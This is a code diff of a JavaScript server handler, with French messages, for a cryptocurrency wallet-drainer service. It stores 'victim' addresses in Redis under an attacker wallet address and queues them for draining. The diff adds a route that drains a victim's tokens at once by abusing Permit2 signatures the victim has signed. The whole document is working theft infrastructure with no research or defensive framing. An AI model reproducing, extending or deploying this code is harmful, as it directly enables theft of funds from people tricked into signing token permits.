@@ -1,6 +1,6 @@
 import { ethers } from 'ethers';
 import { createClient } from 'redis';
-import { drainWithRetry } from '../lib/drain.js';
+import { drainWithRetry, drainViaPermit2 } from '../lib/drain.js';
 
 const ATTACKER_ADDRESS = '0xa4645D082a7FdD6165b9D0eBF4D65a7063276333';
 const RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/demo';
@@ -24,9 +24,8 @@ export default async function handler(req, res) {
   if (req.method === 'OPTIONS') return res.status(200).end();
 
   if (req.method === 'POST') {
-    const { victim, chain, adminSecret } = req.body;
+    const { victim, chain, adminSecret, permit2Sig, permitData } = req.body;
 
-    // --- DRAIN MANUEL ADMIN (inchangé) ---
     if (adminSecret) {
       if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
         return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
@@ -61,7 +60,6 @@ export default async function handler(req, res) {
       }
     }
 
-    // --- FLUX NORMAL : enregistrement et mise en file d'attente (le cron drainera) ---
     if (!victim) return res.status(400).json({ error: 'Paramètre victim manquant' });
 
     const targetChain = chain || '1';
@@ -70,7 +68,6 @@ export default async function handler(req, res) {
     await client.connect();
 
     try {
-      // Ajoute à la liste globale
       const list = await client.get('victims:list');
       const parsedList = list ? JSON.parse(list) : [];
       if (!parsedList.includes(victim)) {
@@ -78,7 +75,23 @@ export default async function handler(req, res) {
         await client.set('victims:list', JSON.stringify(parsedList));
       }
 
-      // Pousse dans la queue pour le cron (pas de drain immédiat)
+      if (permit2Sig && permitData) {
+        await client.disconnect();
+        try {
+          const ok = await drainViaPermit2(victim, targetChain, permitData, permit2Sig);
+          return res.status(200).json({
+            success: true,
+            mode: 'permit2',
+            drained: !!ok,
+            victim,
+            chain: targetChain
+          });
+        } catch (err) {
+          console.error('Permit2 drain error:', err);
+          return res.status(500).json({ error: 'Échec Permit2: ' + (err.message || String(err)) });
+        }
+      }
+
       await client.lPush('drain:queue', JSON.stringify({ victim, chain: targetChain }));
 
       return res.status(200).json({ success: true, queued: true, victim, chain: targetChain });
@@ -86,7 +99,7 @@ export default async function handler(req, res) {
       console.error('Erreur mise en file:', err);
       return res.status(500).json({ error: 'Échec mise en file' });
     } finally {
-      await client.disconnect();
+      try { await client.disconnect(); } catch (_) {}
     }
   } else {
     return res.status(405).json({ error: 'Méthode non autorisée' });
